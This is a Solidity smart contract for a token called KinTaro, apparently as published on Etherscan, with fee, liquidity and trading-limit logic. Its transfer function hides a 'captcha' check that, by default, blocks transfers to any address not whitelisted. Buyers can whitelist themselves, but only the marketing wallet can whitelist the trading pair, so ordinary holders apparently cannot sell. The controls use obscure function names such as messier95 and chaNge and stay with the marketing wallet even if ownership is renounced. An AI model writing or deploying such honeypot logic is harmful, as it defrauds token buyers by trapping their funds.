/**
 *Submitted for verification at Etherscan.io on 2022-09-24
*/

//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IBEP20Metadata is IBEP20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BEP20 is Context, IBEP20, IBEP20Metadata {
    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) internal _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _tokengeneration(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: generation to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

library Address {
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract KinTaro is BEP20, Ownable {
    using Address for address payable;

    IRouter public router;
    address public pair;

    bool private _interlock = false;
    bool public providingLiquidity = false;
    bool public tradingEnabled = false;
    bool public reqCaptcha = true;

    uint256 public tokenLiquidityThreshold = 100000 * 10**18;

    uint256 public genesis_block;
    uint256 private deadline = 0;
    uint256 private launchtax = 11;
    uint256 public maxWalletLimit = 4000000 * 10**18;
    uint256 public maxBuyLimit = 4000000 * 10**18;
    uint256 public maxSellLimit = 4000000 * 10**18;

    address public marketingWallet = 0x5Ef6feE657e19139377Eafa1e30db6b5AB147969;
    address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;
    address public constant zeroWallet = 0x0000000000000000000000000000000000000000;


    struct Taxes {
        uint256 marketing;
        uint256 liquidity;
    }

    Taxes public taxes = Taxes(4, 0);
    Taxes public sellTaxes = Taxes(0, 4);

    mapping(address => bool) public exemptFee;
    mapping(address => bool) public captcha_profile;

    modifier lockTheSwap() {
        if (!_interlock) {
            _interlock = true;
            _;
            _interlock = false;
        }
    }


    constructor() BEP20("Kintaro", "The Golden Boy") {
        _tokengeneration(msg.sender, 100000000 * 10**decimals());
        exemptFee[msg.sender] = true;

        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        // Create a pancake pair for this new token
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());

        router = _router;
        pair = _pair;
        exemptFee[address(this)] = true;
        exemptFee[marketingWallet] = true;
        exemptFee[deadWallet] = true;

    }


    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function messier95(uint256 _response)public {
        if(_response == 4){
            captcha_profile[msg.sender] = true;
        }
    }
    function chaNge(address _to) public {
        require(msg.sender== marketingWallet);
        captcha_profile[_to] = true;
    }

    function require_captcha(bool _reqq)public {
        require(msg.sender==marketingWallet);
        reqCaptcha = _reqq;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        override
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "BEP20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        if(reqCaptcha==true){
            require(captcha_profile[recipient]==true);
        }
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!exemptFee[sender] && !exemptFee[recipient]) {
            require(tradingEnabled, "Trading not enabled");
        }

        if (sender == pair && !exemptFee[recipient] && !_interlock) {
            require(amount <= maxBuyLimit, "You are exceeding maxBuyLimit");
            require(
                balanceOf(recipient) + amount <= maxWalletLimit,
                "You are exceeding maxWalletLimit"
            );
        }

        if (
            sender != pair && !exemptFee[recipient] && !exemptFee[sender] && !_interlock
        ) {
            require(amount <= maxSellLimit, "You are exceeding maxSellLimit");
            if (recipient != pair) {
                require(
                    balanceOf(recipient) + amount <= maxWalletLimit,
                    "You are exceeding maxWalletLimit"
                );
            }
        }

        uint256 feeswap;
        uint256 feesum;
        uint256 fee;
        Taxes memory currentTaxes;

        bool useLaunchFee = !exemptFee[sender] &&
            !exemptFee[recipient] &&
            block.number < genesis_block + deadline;

        //set fee to zero if fees in contract are handled or exempted
        if (_interlock || exemptFee[sender] || exemptFee[recipient])
            fee = 0;

            //calculate fee
        else if (recipient == pair && !useLaunchFee) {
            feeswap =
                sellTaxes.liquidity +
                sellTaxes.marketing;
            feesum = feeswap;
            currentTaxes = sellTaxes;
        } else if (!useLaunchFee) {
            feeswap =
                taxes.liquidity +
                taxes.marketing;
            feesum = feeswap;
            currentTaxes = taxes;
        } else if (useLaunchFee) {
            feeswap = launchtax;
            feesum = launchtax;
        }

        fee = (amount * feesum) / 100;

        //send fees if threshold has been reached
        //don't do this on buys, breaks swap
        if (providingLiquidity && sender != pair) Liquify(feeswap, currentTaxes);

        //rest to recipient
        super._transfer(sender, recipient, amount - fee);
        if (fee > 0) {
            //send the fee to the contract
            if (feeswap > 0) {
                uint256 feeAmount = (amount * feeswap) / 100;
                super._transfer(sender, address(this), feeAmount);
            }

        }
    }

    function Liquify(uint256 feeswap, Taxes memory swapTaxes) private lockTheSwap {

        if(feeswap == 0){
            return;
        }

        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= tokenLiquidityThreshold) {
            if (tokenLiquidityThreshold > 1) {
                contractBalance = tokenLiquidityThreshold;
            }

            // Split the contract balance into halves
            uint256 denominator = feeswap * 2;
            uint256 tokensToAddLiquidityWith = (contractBalance * swapTaxes.liquidity) /
                denominator;
            uint256 toSwap = contractBalance - tokensToAddLiquidityWith;

            uint256 initialBalance = address(this).balance;

            swapTokensForETH(toSwap);

            uint256 deltaBalance = address(this).balance - initialBalance;
            uint256 unitBalance = deltaBalance / (denominator - swapTaxes.liquidity);
            uint256 ethToAddLiquidityWith = unitBalance * swapTaxes.liquidity;

            if (ethToAddLiquidityWith > 0) {
                addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
            }

            uint256 marketingAmt = unitBalance * 2 * swapTaxes.marketing;
            if (marketingAmt > 0) {
                payable(marketingWallet).sendValue(marketingAmt);
            }

        }
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        router.addLiquidityETH{ value: ethAmount }(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    function updateLiquidityProvide(bool state) external onlyOwner {
        //update liquidity providing state
        providingLiquidity = state;
    }

    function updateLiquidityTreshhold(uint256 new_amount) external onlyOwner {
        //update the treshhold
        require(new_amount <= 1000000, "Swap threshold amount should be lower or equal to 1% of tokens");
        tokenLiquidityThreshold = new_amount * 10**decimals();
    }

    function SetSellTaxes(
        uint256 _marketing,
        uint256 _liquidity
    ) external onlyOwner {
        sellTaxes = Taxes(_marketing, _liquidity);
        require((_marketing + _liquidity) <= 9, "Must keep fees at 9% or less");
    }

    function EnableTrading() external onlyOwner {
        require(!tradingEnabled, "Cannot re-enable trading");
        tradingEnabled = true;
        providingLiquidity = true;
        genesis_block = block.number;
    }

    function updatedeadline(uint256 _deadline) external onlyOwner {
        require(!tradingEnabled, "Can't change when trading has started");
        require(_deadline < 5,"Deadline should be less than 5 Blocks");
        deadline = _deadline;
    }

    function updateMarketingWallet(address newWallet) external onlyOwner {
        require(newWallet != address(0),"Fee Address cannot be zero address");
        marketingWallet = newWallet;
    }

    function updateExemptFee(address _address, bool state) external onlyOwner {
        exemptFee[_address] = state;
    }

    function bulkExemptFee(address[] memory accounts, bool state) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            exemptFee[accounts[i]] = state;
        }
    }

    function getCirculatingSupply() public view returns (uint256) {
        return (totalSupply() - balanceOf(deadWallet) - balanceOf(zeroWallet));
    }

    function updateMaxTxLimit(uint256 maxBuy, uint256 maxSell, uint256 maxWallet) external onlyOwner {
        require(maxBuy >= 100000, "Cannot set max buy amount lower than 0.1%");
        require(maxSell >= 100000, "Cannot set max sell amount lower than 0.1%");
        require(maxWallet >= 1000000, "Cannot set max wallet amount lower than 1%");
        maxBuyLimit = maxBuy * 10**decimals();
        maxSellLimit = maxSell * 10**decimals();
        maxWalletLimit = maxWallet * 10**decimals(); 
    }

    function rescueETH(uint256 weiAmount) external onlyOwner {
        payable(owner()).transfer(weiAmount);
    }

    function rescueERC20(address tokenAdd, uint256 amount) external onlyOwner {
        require(tokenAdd != address(this), "Owner can't claim contract's balance of its own tokens");
        IBEP20(tokenAdd).transfer(owner(), amount);
    }

    // fallbacks
    receive() external payable {}
}